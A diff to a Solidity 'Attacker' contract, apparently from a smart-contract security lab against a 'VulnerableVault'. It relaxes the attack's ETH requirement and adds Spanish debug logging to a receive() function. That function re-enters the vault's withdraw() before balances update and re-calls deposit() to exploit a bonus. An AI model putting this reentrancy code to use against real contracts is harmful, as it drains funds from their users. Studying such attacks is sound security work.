@@ -23,9 +23,9 @@ contract Attacker is IAttacker {
         vault = VulnerableVault(_vault);
     }
     
-    // Function to start the attack
+    // Main attack function
     function attack() external payable override {
-        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
+        require(msg.value > 0, "Need ETH to attack");
         
         console.log("Starting reentrancy attack...");
         console.log("Initial attacker balance:", address(this).balance);
@@ -79,26 +79,43 @@ contract Attacker is IAttacker {
     
     // receive() function - KEY ATTACK POINT
     receive() external payable override {
-        console.log("Receive called with:", msg.value);
-        console.log("Attack count:", attackCount);
+        console.log("BREAKPOINT ATTACKER - Receive llamado:");
+        console.log("   - ETH recibido:", msg.value);
+        console.log("   - Attack count antes:", attackCount);
+        console.log("   - Total stolen antes:", totalStolen);
+        console.log("   - Balance del vault:", address(vault).balance);
+        console.log("   - Balance del attacker:", address(this).balance);
         
         totalStolen += msg.value;
         attackCount++;
         
+        console.log("BREAKPOINT ATTACKER - Despues de actualizar contadores:");
+        console.log("   - Attack count despues:", attackCount);
+        console.log("   - Total stolen despues:", totalStolen);
+        
         emit AttackExecuted(attackCount, msg.value);
         
-        // ❌ ATTACK: Reentrancy in withdraw
+        // ATTACK: Reentrancy in withdraw
         // While the vault state hasn't been updated,
         // we can call withdraw() again
         if (attackCount < 5 && address(vault).balance >= msg.value) {
-            console.log("Executing reentrancy...");
+            console.log("BREAKPOINT ATTACKER - Ejecutando reentrancy:");
+            console.log("   - Attack count:", attackCount);
+            console.log("   - Vault balance disponible:", address(vault).balance);
+            console.log("   - Amount a retirar:", msg.value);
+            console.log("   - LLAMANDO withdraw() NUEVAMENTE!");
+            
             vault.withdraw(msg.value);
         }
         
-        // ❌ ATTACK: Reentrancy in deposit bonus
+        // ATTACK: Reentrancy in deposit bonus
         // We can also exploit the deposit bonus
         if (attackCount < 3 && address(this).balance >= 1 ether) {
-            console.log("Exploiting deposit bonus...");
+            console.log("BREAKPOINT ATTACKER - Explotando deposit bonus:");
+            console.log("   - Attack count:", attackCount);
+            console.log("   - Balance del attacker:", address(this).balance);
+            console.log("   - LLAMANDO deposit() NUEVAMENTE!");
+            
             vault.deposit{value: 1 ether}();
         }
     }
